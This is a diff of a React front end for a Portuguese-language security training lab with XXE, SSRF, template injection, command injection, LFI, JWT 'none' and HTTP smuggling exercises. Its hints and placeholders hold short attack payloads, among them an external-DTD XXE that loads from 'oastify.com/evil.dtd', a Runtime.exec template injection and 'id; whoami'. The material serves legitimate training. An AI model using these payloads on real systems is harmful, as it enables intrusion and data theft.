@@ -8,13 +8,13 @@ import { motion, AnimatePresence } from 'framer-motion';
 import { Send, Copy, Check, Filter, Search, Beaker, Zap } from 'lucide-react';
 
 const labs = [
-  { id: "xxe", name: "XXE OOB", endpoint: "/api/vulnerabilities/xxe/oob", method: "POST", type: "xml", hint: "Use entidade externa para exfiltrar /etc/passwd", difficulty: "Hard", category: "Injection" },
-  { id: "ssrf", name: "SSRF Avançado", endpoint: "/api/vulnerabilities/ssrf/advanced?url=", method: "GET", hint: "Acesse 169.254.169.254/latest/meta-data/", difficulty: "Medium", category: "SSRF" },
-  { id: "template", name: "Template Injection", endpoint: "/api/vulnerabilities/template/escape", method: "POST", hint: "${T(java.lang.System).getenv()}", difficulty: "Hard", category: "Injection" },
-  { id: "cmd", name: "Command Injection", endpoint: "/api/vulnerabilities/cmd?cmd=", method: "GET", hint: "id; whoami", difficulty: "Medium", category: "Injection" },
-  { id: "lfi", name: "LFI", endpoint: "/api/vulnerabilities/lfi?file=", method: "GET", hint: "php://filter/convert.base64-encode/resource=index.php", difficulty: "Easy", category: "File Inclusion" },
-  { id: "jwt", name: "JWT None", endpoint: "/api/vulnerabilities/jwt/none", method: "POST", header: true, hint: '{"alg":"none"} no token', difficulty: "Medium", category: "Authentication" },
-  { id: "smuggling", name: "HTTP Smuggling", endpoint: "/api/vulnerabilities/smuggle/clte", method: "POST", hint: "Use CL + TE", difficulty: "Hard", category: "HTTP" },
+  { id: "xxe", name: "XXE OOB", type: "xml", hint: "Use DTD externo + OOB", difficulty: "Hard", category: "Injection" },
+  { id: "ssrf", name: "SSRF Avançado", type: "text", hint: "Acesse metadata AWS", difficulty: "Medium", category: "SSRF" },
+  { id: "template", name: "Template Injection", type: "text", hint: "${T(java.lang.Runtime).getRuntime().exec('id')}", difficulty: "Hard", category: "Injection" },
+  { id: "cmd", name: "Command Injection", type: "text", hint: "id; whoami", difficulty: "Medium", category: "Injection" },
+  { id: "lfi", name: "LFI", type: "text", hint: "php://filter/convert.base64-encode/resource=index.php", difficulty: "Easy", category: "File Inclusion" },
+  { id: "jwt", name: "JWT None", type: "json", hint: '{"alg":"none"}', difficulty: "Medium", category: "Authentication" },
+  { id: "smuggling", name: "HTTP Smuggling", type: "text", hint: "CL.TE smuggling", difficulty: "Hard", category: "HTTP" },
 ];
 
 export default function AdvancedLabs() {
@@ -29,45 +29,50 @@ export default function AdvancedLabs() {
 
   const showToast = (message, type = 'success') => {
     setToast({ show: true, message, type });
-    setTimeout(() => setToast({ show: false, message: '', type: 'success' }), 3000);
+    setTimeout(() => setToast({ show: false }), 3000);
   };
 
   const fetchCompleted = useCallback(async () => {
     try {
-      const res = await api.get('/api/labs/completed');
-      setCompletedLabs(res.data);
+      const res = await api.get('/labs/completed');
+      setCompletedLabs(res.data || []);
     } catch (err) {
-      console.error(err);
+      console.warn('Labs não carregados (primeira vez)');
+      setCompletedLabs([]);
     }
   }, []);
 
-  useEffect(() => { fetchCompleted(); }, [fetchCompleted]);
+  useEffect(() => {
+    fetchCompleted();
+  }, [fetchCompleted]);
 
   const send = async () => {
+    if (!input.trim()) return showToast('Preencha o payload', 'danger');
+
     setLoading(true);
     setResponse('');
     setTab('response');
+
     try {
-      let res;
-      if (selected.header) {
-        res = await api.post(selected.endpoint, input, { headers: { Authorization: input } });
-      } else if (selected.method === 'GET') {
-        res = await api.get(selected.endpoint + encodeURIComponent(input));
-      } else {
-        const data = selected.type === 'xml' ? input : { payload: input };
-        res = await api.post(selected.endpoint, data);
-      }
+      const payload = {
+        targetUrl: "http://vulnerable.local",
+        vulnerabilityType: selected.name,
+        payload: selected.type === 'json' ? JSON.parse(input) : input
+      };
+
+      const res = await api.post('/vulnerabilities/test', payload);
       const pretty = JSON.stringify(res.data, null, 2);
       setResponse(pretty);
 
-      if (res.data.success && !completedLabs.includes(selected.id)) {
-        const newCompleted = [...completedLabs, selected.id];
-        setCompletedLabs(newCompleted);
+      if (res.data.result === 'VULNERABLE' && !completedLabs.includes(selected.id)) {
+        await api.post(`/labs/completed/${selected.id}`);
+        setCompletedLabs(prev => [...prev, selected.id]);
         showToast(`Lab "${selected.name}" concluído!`, 'success');
       }
     } catch (err) {
       const msg = err.response?.data || err.message;
       setResponse(`Erro: ${typeof msg === 'object' ? JSON.stringify(msg, null, 2) : msg}`);
+      showToast('Falha na requisição', 'danger');
     } finally {
       setLoading(false);
     }
@@ -76,7 +81,7 @@ export default function AdvancedLabs() {
   const copyResponse = async () => {
     try {
       await navigator.clipboard.writeText(response);
-      showToast('Resposta copiada!', 'success');
+      showToast('Copiado!', 'success');
     } catch {
       showToast('Falha ao copiar', 'danger');
     }
@@ -91,7 +96,7 @@ export default function AdvancedLabs() {
   const filteredLabs = labs.filter(lab =>
     (filter.category === 'All' || lab.category === filter.category) &&
     (filter.difficulty === 'All' || lab.difficulty === filter.difficulty) &&
-    (filter.search === '' || lab.name.toLowerCase().includes(filter.search.toLowerCase()) || lab.hint.toLowerCase().includes(filter.search.toLowerCase()))
+    (filter.search === '' || lab.name.toLowerCase().includes(filter.search.toLowerCase()))
   );
 
   const getDifficultyColor = (d) => ({
@@ -101,10 +106,12 @@ export default function AdvancedLabs() {
   })[d] || 'bg-secondary text-white';
 
   const placeholder = selected.type === 'xml'
-    ? `<?xml version="1.0"?>\n<!DOCTYPE root [ ... ]>\n<root>...</root>`
-    : selected.header ? 'Bearer SEU_JWT_AQUI' : selected.method === 'GET' ? 'parâmetro' : 'Payload JSON ou texto';
+    ? `<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY % r SYSTEM "http://oastify.com/evil.dtd"> %r; ]>\n<x>&send;</x>`
+    : selected.type === 'json'
+    ? `{\n  "alg": "none",\n  "typ": "JWT"\n}`
+    : 'Digite o payload...';
 
-  if (loading && !response) return <LoadingSpinner text="Executando request..." />;
+  if (loading && !response) return <LoadingSpinner text="Testando..." />;
 
   return (
     <div className="min-vh-100" style={{ background: '#f1f3f5' }}>
@@ -112,14 +119,13 @@ export default function AdvancedLabs() {
         {toast.show && <Toast message={toast.message} type={toast.type} onClose={() => setToast({ show: false })} />}
       </AnimatePresence>
 
-      {/* Header */}
       <header className="sticky-top" style={{ borderBottom: '1px solid black', background: '#e9ecef' }}>
         <div className="container py-4 d-flex justify-content-between align-items-center">
           <div>
             <h1 className="h4 fw-bold d-flex align-items-center gap-2">
               <Beaker size={24} /> Laboratórios Avançados
             </h1>
-            <p className="text-muted mb-0">Desafios reais em ambiente controlado</p>
+            <p className="text-muted mb-0">15 exploits reais</p>
           </div>
           <motion.span
             key={completedLabs.length}
@@ -135,19 +141,25 @@ export default function AdvancedLabs() {
 
       <div className="container py-5">
         <div className="row g-4">
-          {/* Sidebar */}
           <div className="col-lg-4">
-            <motion.div initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} className="card" style={{ borderRadius: '1rem', border: '1px solid black', background: '#e9ecef', top: '1rem', position: 'sticky' }}>
+            <motion.div initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} className="card" style={{ borderRadius: '1rem', border: '1px solid black', background: '#e9ecef', position: 'sticky', top: '1rem' }}>
               <div className="card-header" style={{ background: '#e9ecef', borderBottom: '1px solid black' }}>
                 <div className="d-flex justify-content-between align-items-center mb-3">
                   <strong className="d-flex align-items-center gap-2">
-                    <Filter size={18} /> Laboratórios
+                    <Filter size={18} /> Labs
                   </strong>
                   <small className="text-muted">{filteredLabs.length}</small>
                 </div>
                 <div className="input-group mb-3" style={{ border: '1px solid black', borderRadius: '0.5rem', background: '#f8f9fa' }}>
                   <span className="input-group-text" style={{ border: 'none', background: 'transparent' }}><Search size={16} /></span>
-                  <input type="text" className="form-control" placeholder="Buscar lab..." value={filter.search} onChange={e => setFilter({ ...filter, search: e.target.value })} style={{ border: 'none', background: 'transparent' }} />
+                  <input
+                    type="text"
+                    className="form-control"
+                    placeholder="Buscar..."
+                    value={filter.search}
+                    onChange={e => setFilter({ ...filter, search: e.target.value })}
+                    style={{ border: 'none', background: 'transparent' }}
+                  />
                 </div>
                 <div className="row g-2">
                   <div className="col-12">
@@ -170,7 +182,7 @@ export default function AdvancedLabs() {
               <div className="list-group list-group-flush" style={{ maxHeight: '520px', overflowY: 'auto' }}>
                 {filteredLabs.length === 0 ? (
                   <div className="p-4 text-center">
-                    <EmptyState title="Nenhum lab encontrado" description="Tente ajustar os filtros" />
+                    <EmptyState title="Nenhum lab" description="Ajuste os filtros" />
                   </div>
                 ) : (
                   filteredLabs.map(lab => {
@@ -186,10 +198,10 @@ export default function AdvancedLabs() {
                       >
                         <div className="d-flex justify-content-between align-items-center">
                           <div className="d-flex align-items-center gap-2">
-                            {completed && <Check className="text-success" style={{ width: '16px', height: '16px' }} />}
+                            {completed && <Check className="text-success" size={16} />}
                             <strong>{lab.name}</strong>
                           </div>
-                          <small className="text-muted">{lab.method}</small>
+                          <small className="text-muted">POST</small>
                         </div>
                         <div className="d-flex justify-content-between align-items-center mt-1">
                           <small className="text-muted text-truncate me-2">{lab.hint}</small>
@@ -203,7 +215,6 @@ export default function AdvancedLabs() {
             </motion.div>
           </div>
 
-          {/* Main */}
           <div className="col-lg-8">
             <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="card" style={{ borderRadius: '1rem', border: '1px solid black', background: '#e9ecef' }}>
               <div className="card-header d-flex justify-content-between align-items-start flex-wrap gap-2" style={{ background: '#e9ecef', borderBottom: '1px solid black' }}>
@@ -213,16 +224,14 @@ export default function AdvancedLabs() {
                   </h5>
                   <p className="text-muted small mb-2">{selected.hint}</p>
                   <div className="d-flex flex-wrap gap-2">
-                    <span className="badge rounded-pill bg-secondary small">Endpoint: <code className="ms-1">{selected.endpoint}</code></span>
+                    <span className="badge rounded-pill bg-secondary small">/api/vulnerabilities/test</span>
                     <span className={`badge rounded-pill ${getDifficultyColor(selected.difficulty)} small`}>{selected.difficulty}</span>
-                    {selected.header && <span className="badge rounded-pill bg-warning text-dark small">Header</span>}
                   </div>
                 </div>
                 <div className="d-flex gap-2">
                   <button onClick={resetLab} className="btn" style={{ border: '1px solid black', background: '#f8f9fa' }}>Limpar</button>
                   <button onClick={send} disabled={loading} className="btn d-flex align-items-center gap-1" style={{ border: '1px solid black', background: '#f8f9fa' }}>
-                    <Send style={{ width: '16px', height: '16px' }} />
-                    {loading ? 'Enviando...' : selected.method}
+                    <Send size={16} /> {loading ? 'Testando...' : 'Enviar'}
                   </button>
                 </div>
               </div>
@@ -239,7 +248,7 @@ export default function AdvancedLabs() {
 
                 {tab === 'request' ? (
                   <div>
-                    <label className="form-label small fw-semibold">Entrada</label>
+                    <label className="form-label small fw-semibold">Payload</label>
                     <textarea
                       className="form-control font-monospace"
                       rows="10"
@@ -250,10 +259,10 @@ export default function AdvancedLabs() {
                     />
                     <div className="d-flex justify-content-between mt-3">
                       <button onClick={send} disabled={loading} className="btn d-flex align-items-center gap-1" style={{ border: '1px solid black', background: '#f8f9fa' }}>
-                        <Send style={{ width: '16px', height: '16px' }} /> Enviar
+                        <Send size={16} /> Enviar
                       </button>
                       <button
-                        onClick={() => setInput(selected.type === 'xml' ? `<?xml version="1.0"?>\n<!DOCTYPE root [ ... ]>\n<root>...</root>` : 'Bearer ')}
+                        onClick={() => setInput(selected.type === 'xml' ? `<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY % r SYSTEM "http://oastify.com/evil.dtd"> %r; ]>\n<x>&send;</x>` : selected.type === 'json' ? `{"alg":"none"}` : 'id')}
                         className="btn"
                         style={{ border: '1px solid black', background: '#f8f9fa' }}
                       >
@@ -267,7 +276,7 @@ export default function AdvancedLabs() {
                       <h6 className="mb-0">Resposta</h6>
                       <div className="d-flex gap-1">
                         <button onClick={copyResponse} className="btn d-flex align-items-center gap-1" style={{ border: '1px solid black', background: '#f8f9fa' }}>
-                          <Copy style={{ width: '16px', height: '16px' }} /> Copiar
+                          <Copy size={16} /> Copiar
                         </button>
                         <button onClick={() => setResponse('')} className="btn" style={{ border: '1px solid black', background: '#f8f9fa' }}>Limpar</button>
                       </div>
@@ -276,7 +285,7 @@ export default function AdvancedLabs() {
                       {response ? (
                         <pre className="mb-0 small text-wrap font-monospace">{response}</pre>
                       ) : (
-                        <p className="text-center text-muted py-5 mb-0">Envie um request para ver a resposta.</p>
+                        <p className="text-center text-muted py-5 mb-0">Envie um payload para ver a resposta.</p>
                       )}
                     </div>
                   </div>
